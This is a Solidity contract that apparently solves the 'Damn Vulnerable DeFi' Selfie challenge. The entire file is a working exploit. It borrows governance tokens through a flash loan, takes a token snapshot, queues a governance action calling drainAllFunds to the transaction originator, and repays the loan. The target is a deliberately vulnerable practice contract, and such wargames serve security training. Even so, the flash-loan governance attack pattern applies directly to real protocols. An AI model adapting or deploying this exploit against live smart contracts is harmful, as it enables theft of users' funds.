pragma solidity ^0.6.0;

import "./SelfiePool.sol";

interface IDamnValuableTokenSnapshot {
    function snapshot() external returns (uint256);
}

contract SelfiePoolAttacker {
    function attack(address pool, uint256 amount) public {
        SelfiePool(pool).flashLoan(amount);
    }

    function receiveTokens(address token, uint256 amount) public {
        IDamnValuableTokenSnapshot(address(SelfiePool(msg.sender).token())).snapshot();
        SelfiePool(msg.sender).governance().queueAction(
            msg.sender,
            abi.encodeWithSignature("drainAllFunds(address)", tx.origin),
            0
        );
        IERC20(token).transfer(msg.sender, amount);
    }
}
